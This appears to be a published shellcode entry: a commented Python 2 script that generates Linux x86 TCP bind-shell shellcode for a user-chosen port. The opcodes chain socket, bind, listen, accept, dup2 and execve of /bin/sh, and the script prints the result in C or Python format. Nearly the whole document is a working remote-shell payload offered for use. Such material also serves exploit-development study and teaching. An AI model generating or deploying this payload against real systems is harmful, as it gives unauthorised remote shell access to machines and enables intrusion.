# Title: Linux/x86 - Bind Shell Generator Shellcode (114 bytes)
# Author: Bobby Cooke
# Date: 2020-01-29
# Tested On: Ubuntu 3.13.0-32-generic #57~precise1-Ubuntu i386

#!/usr/bin/python

# Take users TCP port as input
port = raw_input("Enter TCP Port Number: ")
# Convert input string to an integer
deciPort = int(port)
# Format the integer to Hex Integer
hexPort = "{:02x}".format(deciPort)
#print "Hex value of Decimal Number:",hexPort
# Check the length of the output hex string
hexStrLen = len(hexPort)
# Check if the hex string is even or odd with modulus 2
oddEven = hexStrLen % 2
# if it returns 1 then it's odd. We need to add a leading 0
if oddEven == 1:
    hexPort = "0" + hexPort
# converts the  port number into the correct hex format
tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
print "Your TCP Port in Hex is:","\\x"+tcpPort
nullCheck = deciPort % 256
if nullCheck == 0 :
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)

# 1. Create a new Socket
# <socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
#   EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
scPart1 = "\x31\xc0"  # xor eax, eax; This sets the EAX Register to NULL (all zeros).
scPart1 += "\xb0\x66" # mov al, 0x66; EAX is now 0x00000066 = SYSCALL 102 - socketcall
scPart1 += "\x31\xdb" # xor ebx, ebx; This sets the EBX Register to NULL (all zeros).
scPart1 += "\xb3\x01" # mov bl, 0x1; EBX is set to create a socket
scPart1 += "\x31\xc9" # xor ecx, ecx; This sets the ECX Register to NULL (all zeros).
scPart1 += "\x51"     # push ecx; ECX[2]. ECX is NULL
scPart1 += "\x53"     # push ebx; ECX[1]. EBX already has the value we need for ECX[1]
scPart1 += "\x6a\x02" # push dword 0x2 ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
scPart1 += "\x89\xe1" # mov ecx, esp ; ECX now holds the pointer to the arg array
scPart1 += "\xcd\x80" # int 0x80 ; System Call Interrupt 0x80 - Executes socket().
scPart1 += "\x96"     # xchg esi, eax ; After the SYSCAL, sockfd is stored in the EAX Register, save in ESI

# 2. Create TCP-IP Address and Bind the Address to the Socket
# struct sockaddr_in ipSocketAddr = {
# .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY};
#       ARG[0]               ARG[1]                          ARG[2]
#<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
#  EAX=0x66      EBX   ECX[0]                   ECX[1]                   ECX[2]
scPart1 += "\x31\xc0" # xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
scPart1 += "\xb0\x66" # mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
scPart1 += "\x31\xdb" # xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
scPart1 += "\xb3\x02" # mov bl, 0x2       ; EBX is set to create a socket
scPart1 += "\x31\xd2" # xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
scPart1 += "\x52"     # push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
scPart1 += "\x66\x68" # push word 0x??    ; ; ARG[1]. This is for the TCP Port #
#tcpPort = "\x11\x5c" # TCP Port 4444 = 0x5c11
scPart2 = "\x66\x53"  # push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
scPart2 += "\x31\xc9"  # xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
scPart2 += "\x89\xe1"  # mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register.
scPart2 += "\x6a\x10"  # push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex).
scPart2 += "\x51"      # push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved
scPart2 += "\x56"      # push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier.
scPart2 += "\x89\xe1"  # mov ecx, esp      ; Now we need to point ECX to the top of the loaded stack.
scPart2 += "\xcd\x80"  # int 0x80          ; System Call Interrupt 0x80

# 4. Listen for incoming connections on TCP-IP Socket.
# <socketcall>   listen( ipv4Socket, 0 );
#   EAX=0x66      EBX      ECX[0]   ECX[1]
scPart2 += "\x31\xc0" # xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
scPart2 += "\xb0\x66" # mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
scPart2 += "\x31\xdb" # xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
scPart2 += "\xb3\x04" # mov bl, 0x4      ; EBX is set to listen().
scPart2 += "\x31\xc9" # xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
scPart2 += "\x51"     # push ecx         ; ECX[1]. Push the value 0x0 to the stack.
scPart2 += "\x56"     # push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
scPart2 += "\x89\xe1" # mov ecx, esp     ; Point ECX to the top of the stack.
scPart2 += "\xcd\x80" # int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.

# 5. Accept the incoming connection, and create a connected session.
# <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL );
#   EAX=0x66                     EBX     ECX[0]    ECX[1] ECX[2]
scPart2 += "\x31\xc0" # xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
scPart2 += "\xb0\x66" # mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
scPart2 += "\x31\xdb" # xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
scPart2 += "\xb3\x05" # mov bl, 0x5      ; EBX is set to accept().
scPart2 += "\x31\xc9" # xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
scPart2 += "\x51" # push ecx         ; ECX[2]. Push the value 0x0 to the stack.
scPart2 += "\x51" # push ecx         ; ECX[1]. Push the value 0x0 to the stack.
scPart2 += "\x56" # push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
scPart2 += "\x89\xe1" # mov ecx, esp     ; Point ECX to the top of the stack.
scPart2 += "\xcd\x80" # int 0x80         ; System Call Interrupt 0x80
scPart2 += "\x93" # xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.

# 6. Transfer STDIN, STDOUT, STDERR to the connected Socket.
# dup2( clientSocket, 0 ); // STDIN
# dup2( clientSocket, 1 ); // STDOUT
# dup2( clientSocket, 2 ); // STDERR
# EAX       EBX      ECX
scPart2 += "\x31\xc0" # xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
scPart2 += "\x31\xc9" # xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros).
scPart2 += "\xb1\x02" # mov cl, 0x2    ; This sets the loop counter, and
                      #                ;  will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
#dup2Loop:                             ; Procedure label for the dup2 Loop.
scPart2 += "\xb0\x3f" # mov al, 0x3f   ; EAX is now 0x0000003F = SYSCALL 63 - dup2
scPart2 += "\xcd\x80" # int 0x80       ; System Call Interrupt 0x80 - Executes accept().
                      #                ;   Allowing us to create connected Sockets.
scPart2 += "\x49"     # dec ecx        ; Decrements ECX by 1
scPart2 += "\x79\xf9" # jns dup2Loop /jns short -5  ; Jump back to the dup2Loop Procedure until ECX equals 0.

# 7. Spawn a "/bin/sh" shell for the client, in the connected session.
# execve("/bin//sh", NULL, NULL);
#  EAX      EBX       ECX   EDX
scPart2 += "\x52"                 # push edx       ; Push NULL to terminate the string.
scPart2 += "\x68\x2f\x2f\x73\x68" # push 0x68732f2f  ; "hs//" - Needs to be 4 bytes to fit on stack properly
scPart2 += "\x68\x2f\x62\x69\x6e" # push 0x6e69622f  ; "nib/" - This is "/bin//sh" backwards.
scPart2 += "\x89\xe3"             # mov ebx, esp     ; point ebx to stack where /bin//sh +\x00 is located
scPart2 += "\x89\xd1"             # mov ecx, edx     ; NULL
scPart2 += "\xb0\x0b"             # mov al, 0xb      ; execve System Call Number - 11
scPart2 += "\xcd\x80"             # int 0x80         ; execute execve with system call interrupt

# Initiate the Shellcode variable we will output
shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user added tcp port to the shellcode
shellcode += "\\x"+tcpPort
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2) :
    shellcode += '\\x'
    shellcode += '%02x' %x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2" :
    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "'+formatSC+'"'
else :
    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[----------------Your-Shellcode------------------]"
    print ' unsigned char shellcode[] = \\\n"'+formatSC+'";'